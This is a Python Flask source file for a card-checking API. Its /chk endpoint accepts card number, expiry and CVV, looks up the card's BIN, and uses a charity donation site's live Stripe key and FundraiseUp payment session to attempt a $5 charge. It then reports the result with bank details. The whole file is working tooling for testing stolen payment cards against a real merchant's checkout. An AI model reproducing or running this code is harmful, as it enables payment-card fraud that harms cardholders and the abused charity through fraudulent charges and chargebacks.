from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

@app.route('/')
def index():
    return "Stripe Charge $5 API - Use /chk?lista=ccn|mm|yy|cvv"

@app.route('/chk')
def check_card():
    lista = request.args.get('lista', '')
    
    if not lista:
        return jsonify({"error": "No card data provided"}), 400
    
    # Parse different formats
    if '|' in lista:
        parts = lista.split('|')
    elif '/' in lista:
        # Handle ccn|mm/yy|cvv format
        if '|' in lista:
            main_parts = lista.split('|')
            if '/' in main_parts[1]:
                date_parts = main_parts[1].split('/')
                parts = [main_parts[0], date_parts[0], date_parts[1], main_parts[2]]
            else:
                parts = main_parts
        else:
            parts = lista.split('/')
    else:
        return jsonify({"error": "Invalid format. Use: ccn|mm|yy|cvv or ccn|mm/yy|cvv"}), 400
    
    if len(parts) < 4:
        return jsonify({"error": "Invalid format. Need: ccn|mm|yy|cvv"}), 400
    
    ccn = parts[0].strip()
    mm = parts[1].strip()
    yy = parts[2].strip()
    cvv = parts[3].strip()
    
    # Clean card number (remove spaces)
    ccn = re.sub(r'\s+', '', ccn)
    
    # Format year correctly
    if len(yy) == 2:
        yy = '20' + yy
    
    # Get BIN information
    bin_info = {}
    if len(ccn) >= 6:
        try:
            bin_response = requests.get(f'https://bins.antipublic.cc/bins/{ccn[:6]}', timeout=10)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            bin_info = {}
    
    # First Request - Create payment method
    headers1 = {
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    }

    data1 = f'type=card&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bc53e3de-0b0a-4395-ab12-25848af0dbf3ff4c83&muid=4a33b46e-7ed4-4ea0-aae5-9151aa2d25bd2420f7&sid=01d67f24-5f46-4056-8762-c4eadb1f213e68c0cd&payment_user_agent=stripe.js%2F851131afa1%3B+stripe-js-v3%2F851131afa1%3B+split-card-element&referrer=https%3A%2F%2Fwww.pushbuffalo.org&time_on_page=77491&client_attribution_metadata[client_session_id]=149e617d-3da4-4c3a-8eb4-9fe97acd0a96&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_9RzCojmneCvL31GhYTknluXp&_stripe_account=acct_1EQGX0Ks04gcv5mY&_stripe_version=2025-02-24.acacia'

    try:
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, timeout=30)
        apx = response1.json()
        pid = apx.get("id", "")
        
        if not pid:
            return jsonify({
                "CC": f"{ccn}|{mm}|{yy[-2:] if len(yy) == 4 else yy}|{cvv}",
                "Response": apx,
                "Gateway": "Stripe Charge $5",
                "Bank": bin_info.get('bank', 'N/A'),
                "Country": bin_info.get('country_name', 'N/A'),
                "Brand": bin_info.get('brand', 'N/A'),
                "Type": bin_info.get('type', 'N/A'),
                "Level": bin_info.get('level', 'N/A'),
                "Currency": ', '.join(bin_info.get('country_currencies', ['N/A'])),
                "Author": "@GrandSiLes"
            })
        
        # Second Request - Process payment
        headers2 = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
            'content-type': 'text/plain; charset=utf-8',
            'origin': 'https://www.pushbuffalo.org',
            'priority': 'u=1, i',
            'referer': 'https://www.pushbuffalo.org/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-storage-access': 'active',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-fru-embed-version': '251114-1326',
        }

        data2 = f'{{"paymentMethod":{{"id":"{pid}","object":"payment_method","allow_redisplay":"unspecified","billing_details":{{"address":{{"city":null,"country":null,"line1":null,"line2":null,"postal_code":null,"state":null}},"email":null,"name":null,"phone":null,"tax_id":null}},"card":{{"brand":"visa","brand_product":null,"checks":{{"address_line1_check":null,"address_postal_code_check":null,"cvc_check":null}},"country":"US","display_brand":"visa","exp_month":{mm},"exp_year":{yy},"funding":"debit","generated_from":null,"last4":"{ccn[-4:]}","networks":{{"available":["visa"],"preferred":null}},"regulated_status":"unregulated","three_d_secure_usage":{{"supported":true}},"wallet":null}},"created":1763132239,"customer":null,"livemode":true,"radar_options":{{}},"type":"card"}}}}'

        response2 = requests.post('https://api.fundraiseup.com/paymentSession/7224428805057036011/pay', headers=headers2, data=data2, timeout=30)
        
        return jsonify({
            "CC": f"{ccn}|{mm}|{yy[-2:] if len(yy) == 4 else yy}|{cvv}",
            "Response": response2.json(),
            "Gateway": "Stripe Charge $5",
            "Bank": bin_info.get('bank', 'N/A'),
            "Country": bin_info.get('country_name', 'N/A'),
            "Brand": bin_info.get('brand', 'N/A'),
            "Type": bin_info.get('type', 'N/A'),
            "Level": bin_info.get('level', 'N/A'),
            "Currency": ', '.join(bin_info.get('country_currencies', ['N/A'])),
            "Author": "@GrandSiLes"
        })
        
    except Exception as e:
        return jsonify({
            "CC": f"{ccn}|{mm}|{yy[-2:] if len(yy) == 4 else yy}|{cvv}",
            "Response": {"error": str(e)},
            "Gateway": "Stripe Charge $5",
            "Bank": bin_info.get('bank', 'N/A'),
            "Country": bin_info.get('country_name', 'N/A'),
            "Brand": bin_info.get('brand', 'N/A'),
            "Type": bin_info.get('type', 'N/A'),
            "Level": bin_info.get('level', 'N/A'),
            "Currency": ', '.join(bin_info.get('country_currencies', ['N/A'])),
            "Author": "@GrandSiLes"
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
